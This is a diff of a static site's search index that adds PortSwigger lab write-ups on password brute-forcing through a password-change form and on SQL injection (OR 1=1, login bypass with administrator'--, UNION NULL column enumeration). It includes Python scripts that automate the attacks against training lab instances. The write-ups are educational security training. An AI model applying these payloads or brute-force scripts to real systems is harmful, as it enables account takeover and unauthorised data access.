@@ -778,20 +778,6 @@ document.addEventListener("DOMContentLoaded", function() {
 <script>
 window.store = {
     
-    "http:\/\/localhost:1313\/tags\/authentication\/": {
-        "title": "Authentication",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/authentication\/"
-    },
-    
-    "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_12\/": {
-        "title": "Authentication Vulnerabilities: Lab 12: Password brute-force via password change",
-        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","authentication","login","username-enumeration","response-timing","portswigger-labs","xss","ctf-writeup","python","host-header-injection",],
-        "content": "Lab 12: Password brute-force via password change: This lab\u0026rsquo;s password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos\u0026rsquo;s account and access his \u0026ldquo;My account\u0026rdquo; page.\nYour credentials: wiener:peter Victim\u0026rsquo;s username: carlos Candidate passwords\nInitial Reconnaissance/Discovery: We have access to a simple web-application that allows us to login. Once logged in we can also change our password \u0026amp; email. Reviewing the Password Change Process: Let\u0026rsquo;s perform a password change and review the process whilst intercepting the traffic.\nAs we can see our username is sent as well as the current password, which is to be expected. Our password is then changed. Now you may be thinking this is an easy way to bruteforce this, we just replace the username with our target user \u0026ldquo;carlos\u0026rdquo; \u0026amp; then bruteforce the \u0026ldquo;current-password\u0026rdquo; field using the supplied wordlist until we change carlos\u0026rsquo; password…well it doesn\u0026rsquo;t work.\nLet\u0026rsquo;s keep working with this reset functionality until we can find a route forward.\nTest 1, enter incorrect current password: If we put in an incorrect current password and try a password reset as our user we just get a standard re-direct and no additional information is offered to us.\nTest 2, enter missmatched new passwords with correct current password: If we enter two different passwords for our new password and the correct current password we get the message \u0026ldquo;New passwords do not match\u0026rdquo;. Test 3, enter missmatched new passwords with incorrect current password: If we enter two different passwords for our new password and the incorrect current password we get the message \u0026ldquo;Current password is incorrect\u0026rdquo;. Using a combination of the test 2 \u0026amp; 3 we should be able to bruteforce carlos\u0026rsquo; password by doing the following:\nReplace the username with our target user \u0026ldquo;carlos\u0026rdquo;. Enter missmatched new passwords. Bruteforce the \u0026ldquo;current-password\u0026rdquo; field using the supplied wordlist. Grep for the response \u0026ldquo;New passwords do not match\u0026rdquo;. Bruteforcing Carlos\u0026rsquo; Password VIA Password Reset Form Using Burp: I will show how we can do this using Burp as well as how we can script this attack using python.\nWe send the request to intruder and make the below changes, adding carlos\u0026rsquo; name as the username and then setting the password field as our injection point and purposely entering missmatched passwords. We need to make a custom resource pool as if we don\u0026rsquo;t it will prevent us by limiting our requests out we can do this by clicking \u0026ldquo;Resource Pool\u0026rdquo; in intruder. We now need to set our grep search string to search for \u0026ldquo;New passwords do not match\u0026rdquo;. Once done we can begin the attack and we will see we get a match for the passwords soccer. We can then login \u0026amp; solve the lab. Bruteforcing Carlos\u0026rsquo; Password VIA Password Reset Form Using Python: Prep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: We declare an array of proxies to proxy our requests through as well as the unique url for our lab\u0026rsquo;s my-account page.\nWe are targeting the /my-account/change-password password.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0afc005e0431639f80fae533003e00d5.web-security-academy.net/my-account/change-password\u0026#34; try: request=requests.post(url, proxies=proxies, verify=False, timeout=3, data={ \u0026#39;username\u0026#39;: \u0026#39;carlos\u0026#39;, \u0026#39;current-password\u0026#39;: password, \u0026#39;new-password-1\u0026#39;: \u0026#39;test1\u0026#39;, \u0026#39;new-password-2\u0026#39;: \u0026#39;test2\u0026#39;, }, cookies={ \u0026#39;session\u0026#39;: \u0026#39;HXFGXY0xSaJEVJp3sJnhrgxKOLJOTiAR\u0026#39; }) if \u0026#39;New passwords do not match\u0026#39; in request.text: print(f\u0026#34;Carlos current password is {password}\u0026#34;) Iterate Through Password List: We open the pass.txt file and read the contents. We then iterate through the file and take each line \u0026amp; pass it to the variable password whilst stripping the new line character from the end of it.\nwith open(\u0026#34;pass.txt\u0026#34;, \u0026#39;r\u0026#39;) as passes: for line in passes: password=(line.rstrip(\u0026#39;\\n\u0026#39;)) Bruteforcing Requests: We then send our requests ensuring the username is \u0026ldquo;carlos\u0026rdquo; \u0026amp; the current-password is set to be our password variable.\nWe also ensure our new-passwords missmatch.\nTo be able to call the my-account/change-password we need to be logged in, to do this we can login is our user and then copy their session cookie and pass that in our request.\ntry: request=requests.post(url, proxies=proxies, verify=False, timeout=3, data={ \u0026#39;username\u0026#39;: \u0026#39;carlos\u0026#39;, \u0026#39;current-password\u0026#39;: password, \u0026#39;new-password-1\u0026#39;: \u0026#39;test1\u0026#39;, \u0026#39;new-password-2\u0026#39;: \u0026#39;test2\u0026#39;, }, cookies={ \u0026#39;session\u0026#39;: \u0026#39;HXFGXY0xSaJEVJp3sJnhrgxKOLJOTiAR\u0026#39; }) String Matching: As we know that if we get the string \u0026ldquo;New passwords do not match\u0026rdquo; in a response we have found the current password we check if it is in the request response \u0026amp; then print out carlos\u0026rsquo; password to the terminal if so.\nif \u0026#39;New passwords do not match\u0026#39; in request.text: print(f\u0026#34;Carlos current password is {password}\u0026#34;) Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Script Execution: We now run our script with.\npython lab12.py As we can see we get a hit. And when we try and login we can And the lab is solved. Why This Is Vulnerable: As we saw the username for the password reset is being sent in the POST request, this means we can control this value and perform arbitrary password resets for other users; couple this with that we can infer when a password is correct based on the error messages we receive and bypass the bruteforce mitigation to easily bruteforce the users password.\n", 
-        "url": "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_12\/"
-    },
-    
     "http:\/\/localhost:1313\/author\/": {
         "title": "Author",
         "tags": [],
@@ -820,18 +806,11 @@ window.store = {
         "url": "http:\/\/localhost:1313\/tags\/ctf-writeup\/"
     },
     
-    "http:\/\/localhost:1313\/tags\/host-header-injection\/": {
-        "title": "Host-Header-Injection",
+    "http:\/\/localhost:1313\/tags\/injection\/": {
+        "title": "Injection",
         "tags": [],
         "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/host-header-injection\/"
-    },
-    
-    "http:\/\/localhost:1313\/tags\/login\/": {
-        "title": "Login",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/login\/"
+        "url": "http:\/\/localhost:1313\/tags\/injection\/"
     },
     
     "http:\/\/localhost:1313\/tags\/portswigger\/": {
@@ -862,18 +841,46 @@ window.store = {
         "url": "http:\/\/localhost:1313\/tags\/python\/"
     },
     
-    "http:\/\/localhost:1313\/tags\/response-timing\/": {
-        "title": "Response-Timing",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/response-timing\/"
-    },
-    
     "http:\/\/localhost:1313\/tags\/security-research\/": {
         "title": "Security-Research",
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/tags\/security-research\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/sql\/": {
+        "title": "SQL",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/sql\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/sqli\/": {
+        "title": "Sqli",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/sqli\/"
+    },
+    
+    "http:\/\/localhost:1313\/portswigger\/sqli_lab_1\/": {
+        "title": "SQLi Vulnerabilities: Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",
+        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","portswigger-labs","ctf-writeup","injection","sql","sqli",],
+        "content": "Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: SELECT * FROM products WHERE category = 'Gifts' AND released = 1\nTo solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.\nInitial Reconnaissance/Discovery: We have access to a simple shop front where we can filter for products. When clicking a category we can see it\u0026rsquo;s passed as a parameter in the url Let\u0026rsquo;s send a request to repeater so we can start to test for SQli.\nTesting For SQli: In repeater we can add a single quote after the paramater ' and can see we get 500 error. If we add an additional quote, thereby closing off the original quote we can see we no longer get an error. This means our input is being interpretted as SQL syntax confirming that the application is vulnerable to SQLi. Forcing The Application TO Show All Items In a Category: We can add the payload 'OR 1=1--\u0026rsquo;~ which when url encoded is '+OR+1%3d1-- this makes the url string. And if we check the application we can see we have solved the lab. Why This Works: As the application is performing a query like below when displaying items.\nSELECT * FROM products WHERE category = \u0026#39;Accessories\u0026#39; AND released = 1 When we add on our payload, the query becomes the below.\nSELECT * FROM products WHERE category = \u0026#39;Accessories\u0026#39; OR 1=1-- AND released = 1 As we are injecting our query of 1=1 which will always resolve to TRUE \u0026amp; commenting out the remainder of the query nullifying the AND clause so it is never evaluated so the query will fetch ALL items from the accessories category as 1=1.\n", 
+        "url": "http:\/\/localhost:1313\/portswigger\/sqli_lab_1\/"
+    },
+    
+    "http:\/\/localhost:1313\/portswigger\/sqli_lab_2\/": {
+        "title": "SQLi Vulnerabilities: Lab 2: SQL injection vulnerability allowing login bypass",
+        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","portswigger-labs","ctf-writeup","injection","sql","sqli",],
+        "content": "Lab 2: SQL injection vulnerability allowing login bypass: This lab contains a SQL injection vulnerability in the login function.\nTo solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.\nInitial Reconnaissance/Discovery: When we access the application we can see there is a \u0026ldquo;My account\u0026rdquo; page. If we click it we can see we can login. Let\u0026rsquo;s enter some fake credentials to view the login process. This looks like a standard response. Finding SQLi Vulnerability In the Username Field: If we send the request to repeater we can add a single quote ' after the username we have entered and send the request. Doing so we can see we get a 500 Internal Server Error response.\nIf we then add an additional single quote so it reads test'' we get a 200 OK response. This shows that our input is being interpretted as SQL syntax. Inferring The SQL Query Being Run: We can infer that the query being run on the database is something like:\nSELECT * FROM users WHERE username = \u0026#39;test\u0026#39; AND password = \u0026#39;test\u0026#39; However when we add our single quote it becomes which is syntactically incorrect in SQL as we have an open quotation mark.\nSELECT * FROM users WHERE username = \u0026#39;test\u0026#39;\u0026#39; AND password = \u0026#39;test\u0026#39; Then when we add our second single quote this closes our first single quote and the SQL is valid, although ugly.\nSELECT * FROM users WHERE username = \u0026#39;test\u0026#39;\u0026#39;\u0026#39; AND password = \u0026#39;test\u0026#39; Working along these lines this means we could attempt to comment out the remainder of the SQL query by having a payload of [username]'-- effectively bypassing the password check and allowing us to login.\nSELECT * FROM users WHERE username = \u0026#39;username\u0026#39;--\u0026#39; AND password = \u0026#39;\u0026#39; If we do this for the \u0026ldquo;administrator\u0026rdquo; user. Note: You can put ANY value you want for the password as it will be ignored.\nThis works and we are no logged in. This is due to our payload making the SQL query into the below, bypassing the password check.\nSELECT * FROM users WHERE username = \u0026#39;administrator\u0026#39;--\u0026#39; AND password = \u0026#39;\u0026#39; ", 
+        "url": "http:\/\/localhost:1313\/portswigger\/sqli_lab_2\/"
+    },
+    
+    "http:\/\/localhost:1313\/portswigger\/sqli_lab_3\/": {
+        "title": "SQLi Vulnerabilities: Lab 3: SQL injection UNION attack, determining the number of columns returned by the query:",
+        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","portswigger-labs","ctf-writeup","injection","sql","sqli","python","UNION",],
+        "content": "Lab 3: SQL injection UNION attack, determining the number of columns returned by the query: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.\nTo solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.\nInitial Reconnaissance/Discovery: Looking at the page we can see there are a list of products displayed in a table and we can further filter these by using the search category selector. If we filter for the a category we can see this is passed as a parameter in the url. Establishing SQLi: If we send the request to repeater we can inject a single quote ' after the parameter and see we trigger a 500 Error response. If then add a single another quote we can see that the page renders correctly. Inferring The SQL Query Being Run: Looking at the way the page we can infer the query being run is similar to the below.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39; AND [rest of query] When we add our single quote it becomes the below which is syntactically incorrect.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39; AND [rest of query] However when we add another quote it becomes the below, closing off the first quotation mark we provided.\nSELECT * FROM products WHERE category = \u0026#39;Pets\u0026#39;\u0026#39;\u0026#39; AND [rest of query] UNION Query Requirements: As the lab wants us to display the data using a UNION SELECT query we also need to ensure that the two requirements for this attack are met:\nThe queries must return the same amount of columns: This means that if the original query that is searching the database returns 5 columns our UNION query must also return 5 columns. To solve this issue: We will enumerate the number of columns being returned by the original query. The data types in the columns must be compatible with each query: This means that if the table is returning strings such as item names in column 1 our UNION query has to also return strings or a compatible data type. To solve this issue: We will use a simple method of returning NULL values in this case. This is because NULL is convertible/compatible to every data type, so it will mean that the payload should succeed. Enumerating The Number Of Columns Using ORDER BY Method: In order for us to fulfill the labs requirements we need to display an additional column with NULL values, however for us to do that we need to establish how many columns there are in the table being pulled from. We can do this using the ORDER BY method.\nThis works, by modifying the original query to order the returned results by different columns in the results. This works particularly well as we can just specify a column number we want to order by meaning we don\u0026rsquo;t need to know the names of the columns themselves.\nWhat is also useful is that when we exceed the number of columns available this will cause an error meaning that if submit order by payloads and they all return 200 up until we hit ORDER BY 15-- we know that the total number of columns is 14.\nBurp Suite ORDER By Enumeration: In burpsuite we can place the payload below after the category\n\u0026#39;+ORDER+BY+1-- We then increment the number up until we get an error, in this case 4 returned an error meaning that the table has a total of 3 columns. Displaying The Data Using UNION SELECT: Now we have the total number of columns this means we can use UNION SELECT to display the data.\nAs the table has three columns we will use the payload below.\n\u0026#39; UNION SELECT NULL,NULL,NULL-- As we can see it worked and an additional row is present containing no values. If we remove the UNION SELECT query we can see the row is removed. +Note+: It is also possible to complete this lab just using the UNION SELECT method and increasing the number of columns by incrementing the NULL value.\nSolving The Whole Lab With Python. Prep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: Proxies \u0026amp; URL: We declare an array of proxies to proxy our requests through as well as the unique url \u0026amp; category endpoint. +Note+: The category and URL vary from instance to instance.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a5200e704e3800f80b0e46100b00036.web-security-academy.net/filter?category=Accessories\u0026#34; SQL Syntax \u0026amp; Counters: So now we have our payload broken up into various elements, the reason for this is because we don\u0026rsquo;t want to just supply a list of multiple UNION SELECT statements, doing it this way offers more flexibility as well as ensuring we don\u0026rsquo;t repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn\u0026rsquo;t advise that but you could)\nWe also create a counter variable and set it to 2. This counter is used to track how many NULL values (columns) are in our UNION SELECT payload as we build it. Our starting payload is:\npayload = union + nullPayload # \u0026#34;\u0026#39; UNION SELECT NULL\u0026#34; So before the loop runs we already have one NULL in the query. Inside the loop, we keep appending more ,NULL values to payload and update counter to reflect the number of columns.\nWe don’t start the counter at 0 because SQL columns are conceptually counted from 1 (first column, second column etc…) and our payload already includes the first NULL column. If we started from 0, the value of counter would always lag behind the actual number of NULL columns in the query. By starting at 2, the value of counter stays aligned with the true column count once we begin adding additional NULL values in the loop.\nunion=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 For Loop With Request: We declare a for loop will which repeat for 10 total iterations.\nThen we have a try block which will send our get request to the url with payload \u0026amp; comment.\nResponse Monitoring: We then monitor the responses and if the value \u0026ldquo;My account\u0026rdquo; is found in the body of the response we will:\nPrint the string \u0026quot;Valid payload {payload}-- there are {counter} columns.\u0026quot; which will contain the actual payload as well as the number of columns. Print the full Lab URL including comment and payload so we can easily verify it in a browser. If thesee above conditions are met it will break out of the loop and stop the process.\nIf the above is not found it will add an additional NULL value using the additionalNull variable to the payload \u0026amp; increment the counter by 1 and continue.\nfor i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) break payload=payload+additionalNull counter+=i Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0a5200e704e3800f80b0e46100b00036.web-security-academy.net/filter?category=Accessories\u0026#34; union=\u0026#34;\u0026#39; UNION SELECT \u0026#34; comma=\u0026#34;,\u0026#34; nullPayload=\u0026#34;NULL\u0026#34; comment=\u0026#34;--\u0026#34; additionalNull=comma+nullPayload payload=union+nullPayload counter=2 for i in range(10): try: request=requests.get(url + payload + comment, proxies=proxies, verify=False, timeout=3) if \u0026#39;My account\u0026#39; in request.text: print(f\u0026#34;Valid payload {payload}-- there are {counter} columns.\u0026#34;) print(f\u0026#34;Lab Url: {url+payload+comment}\u0026#34;) break payload=payload+additionalNull counter+=i except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Executing The Python Script To Solve The Lab: As we can see we solve the lab and can see that the valid number of columns is 3 We are also given the concatenated URL \u0026amp; visiting it will show the NULL row. ", 
+        "url": "http:\/\/localhost:1313\/portswigger\/sqli_lab_3\/"
     },
     
     "http:\/\/localhost:1313\/tags\/": {
@@ -883,11 +890,11 @@ window.store = {
         "url": "http:\/\/localhost:1313\/tags\/"
     },
     
-    "http:\/\/localhost:1313\/tags\/username-enumeration\/": {
-        "title": "Username-Enumeration",
+    "http:\/\/localhost:1313\/tags\/union\/": {
+        "title": "UNION",
         "tags": [],
         "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/username-enumeration\/"
+        "url": "http:\/\/localhost:1313\/tags\/union\/"
     },
     
     "http:\/\/localhost:1313\/tags\/web-exploitation\/": {
@@ -902,6 +909,48 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/tags\/websecurity\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/authentication\/": {
+        "title": "Authentication",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/authentication\/"
+    },
+    
+    "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_12\/": {
+        "title": "Authentication Vulnerabilities: Lab 12: Password brute-force via password change",
+        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","authentication","login","username-enumeration","response-timing","portswigger-labs","xss","ctf-writeup","python","host-header-injection",],
+        "content": "Lab 12: Password brute-force via password change: This lab\u0026rsquo;s password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos\u0026rsquo;s account and access his \u0026ldquo;My account\u0026rdquo; page.\nYour credentials: wiener:peter Victim\u0026rsquo;s username: carlos Candidate passwords\nInitial Reconnaissance/Discovery: We have access to a simple web-application that allows us to login. Once logged in we can also change our password \u0026amp; email. Reviewing the Password Change Process: Let\u0026rsquo;s perform a password change and review the process whilst intercepting the traffic.\nAs we can see our username is sent as well as the current password, which is to be expected. Our password is then changed. Now you may be thinking this is an easy way to bruteforce this, we just replace the username with our target user \u0026ldquo;carlos\u0026rdquo; \u0026amp; then bruteforce the \u0026ldquo;current-password\u0026rdquo; field using the supplied wordlist until we change carlos\u0026rsquo; password…well it doesn\u0026rsquo;t work.\nLet\u0026rsquo;s keep working with this reset functionality until we can find a route forward.\nTest 1, enter incorrect current password: If we put in an incorrect current password and try a password reset as our user we just get a standard re-direct and no additional information is offered to us.\nTest 2, enter missmatched new passwords with correct current password: If we enter two different passwords for our new password and the correct current password we get the message \u0026ldquo;New passwords do not match\u0026rdquo;. Test 3, enter missmatched new passwords with incorrect current password: If we enter two different passwords for our new password and the incorrect current password we get the message \u0026ldquo;Current password is incorrect\u0026rdquo;. Using a combination of the test 2 \u0026amp; 3 we should be able to bruteforce carlos\u0026rsquo; password by doing the following:\nReplace the username with our target user \u0026ldquo;carlos\u0026rdquo;. Enter missmatched new passwords. Bruteforce the \u0026ldquo;current-password\u0026rdquo; field using the supplied wordlist. Grep for the response \u0026ldquo;New passwords do not match\u0026rdquo;. Bruteforcing Carlos\u0026rsquo; Password VIA Password Reset Form Using Burp: I will show how we can do this using Burp as well as how we can script this attack using python.\nWe send the request to intruder and make the below changes, adding carlos\u0026rsquo; name as the username and then setting the password field as our injection point and purposely entering missmatched passwords. We need to make a custom resource pool as if we don\u0026rsquo;t it will prevent us by limiting our requests out we can do this by clicking \u0026ldquo;Resource Pool\u0026rdquo; in intruder. We now need to set our grep search string to search for \u0026ldquo;New passwords do not match\u0026rdquo;. Once done we can begin the attack and we will see we get a match for the passwords soccer. We can then login \u0026amp; solve the lab. Bruteforcing Carlos\u0026rsquo; Password VIA Password Reset Form Using Python: Prep The Certificate: If you want to proxy traffic through burp this is mandatory.\nOpen burp\u0026rsquo;s in built web browser and go to http://burpsuite \u0026amp; download the certificate by clicking on “CA Certificate” button on the top right corner. Convert the certificate to the .pem format so the python requests module can use it.\nopenssl x509 -inform der -in certificate.cer -out certificate.pem Imports: First we import the modules we will need, requests \u0026amp; os. We also suppress the requests warning that will show.\nimport requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) If we didn\u0026rsquo;t suppress the warnings the output would look like this. Proxy Setup: Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.\nproxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; Variable Declaration: We declare an array of proxies to proxy our requests through as well as the unique url for our lab\u0026rsquo;s my-account page.\nWe are targeting the /my-account/change-password password.\nproxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0afc005e0431639f80fae533003e00d5.web-security-academy.net/my-account/change-password\u0026#34; Iterate Through Password List: We open the pass.txt file and read the contents. We then iterate through the file and take each line \u0026amp; pass it to the variable password whilst stripping the new line character from the end of it.\nwith open(\u0026#34;pass.txt\u0026#34;, \u0026#39;r\u0026#39;) as passes: for line in passes: password=(line.rstrip(\u0026#39;\\n\u0026#39;)) Bruteforcing Requests: We then send our requests ensuring the username is \u0026ldquo;carlos\u0026rdquo; \u0026amp; the current-password is set to be our password variable.\nWe also ensure our new-passwords missmatch.\nTo be able to call the my-account/change-password we need to be logged in, to do this we can login is our user and then copy their session cookie and pass that in our request.\ntry: request=requests.post(url, proxies=proxies, verify=False, timeout=3, data={ \u0026#39;username\u0026#39;: \u0026#39;carlos\u0026#39;, \u0026#39;current-password\u0026#39;: password, \u0026#39;new-password-1\u0026#39;: \u0026#39;test1\u0026#39;, \u0026#39;new-password-2\u0026#39;: \u0026#39;test2\u0026#39;, }, cookies={ \u0026#39;session\u0026#39;: \u0026#39;HXFGXY0xSaJEVJp3sJnhrgxKOLJOTiAR\u0026#39; }) String Matching: As we know that if we get the string \u0026ldquo;New passwords do not match\u0026rdquo; in a response we have found the current password we check if it is in the request response \u0026amp; then print out carlos\u0026rsquo; password to the terminal if so.\nif \u0026#39;New passwords do not match\u0026#39; in request.text: print(f\u0026#34;Carlos current password is {password}\u0026#34;) Error Handling: These except clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.\nexcept requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Full Script: #!/usr/bin/env python3 import requests import os requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) proxy = \u0026#39;http://127.0.0.1:8080\u0026#39; os.environ[\u0026#39;HTTP_PROXY\u0026#39;] = proxy os.environ[\u0026#39;HTTPS_PROXY\u0026#39;] = proxy os.environ[\u0026#39;REQUESTS_CA_BUNDLE\u0026#39;] = \u0026#34;certificate.pem\u0026#34; proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://127.0.0.1:8080\u0026#34;} url=\u0026#34;https://0afc005e0431639f80fae533003e00d5.web-security-academy.net/my-account/change-password\u0026#34; with open(\u0026#34;pass.txt\u0026#34;, \u0026#39;r\u0026#39;) as passes: for line in passes: #Strip New line character from passwords password=(line.rstrip(\u0026#39;\\n\u0026#39;)) try: request=requests.post(url, proxies=proxies, verify=False, timeout=3, data={ \u0026#39;username\u0026#39;: \u0026#39;carlos\u0026#39;, \u0026#39;current-password\u0026#39;: password, \u0026#39;new-password-1\u0026#39;: \u0026#39;test1\u0026#39;, \u0026#39;new-password-2\u0026#39;: \u0026#39;test2\u0026#39;, }, cookies={ \u0026#39;session\u0026#39;: \u0026#39;HXFGXY0xSaJEVJp3sJnhrgxKOLJOTiAR\u0026#39; } ) if \u0026#39;New passwords do not match\u0026#39; in request.text: print(f\u0026#34;Carlos current password is {password}\u0026#34;) except requests.exceptions.HTTPError as errh: print (\u0026#34;Http Error:\u0026#34;,errh) except requests.exceptions.ConnectionError as errc: print (\u0026#34;Error Connecting:\u0026#34;,errc) except requests.exceptions.Timeout as errt: print (\u0026#34;Timeout Error:\u0026#34;,errt) except requests.exceptions.RequestException as err: print (\u0026#34;OOps: Something Else\u0026#34;,err) Script Execution: We now run our script with.\npython lab12.py As we can see we get a hit. And when we try and login we can And the lab is solved. Why This Is Vulnerable: As we saw the username for the password reset is being sent in the POST request, this means we can control this value and perform arbitrary password resets for other users; couple this with that we can infer when a password is correct based on the error messages we receive and bypass the bruteforce mitigation to easily bruteforce the users password.\n", 
